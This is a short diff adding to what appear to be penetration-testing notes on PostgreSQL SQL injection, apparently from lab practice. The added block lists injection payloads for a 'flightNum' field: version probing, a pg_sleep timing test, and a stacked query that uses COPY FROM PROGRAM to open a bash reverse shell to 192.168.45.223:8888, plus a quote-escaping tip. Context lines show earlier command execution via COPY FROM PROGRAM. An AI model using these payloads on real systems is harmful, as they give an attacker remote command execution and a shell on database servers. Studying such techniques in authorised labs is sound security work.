@@ -449,6 +449,17 @@ create table tmp2(data text);
 copy tmp2 from program 'ls -la';
 select * from tmp2;
 ```
+Revshell:
+
+```
+Used following in *flightNum* field:
+1';select version();--
+1';select 1 from pg_sleep(5);--
+
+1';DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/192.168.45.223/8888 0>&1''';SELECT * FROM cmd_exec;--
+
+In place of single quote in the command, add another single quote.
+```
 
 
 We can delete the table we created with "drop table tmp;".
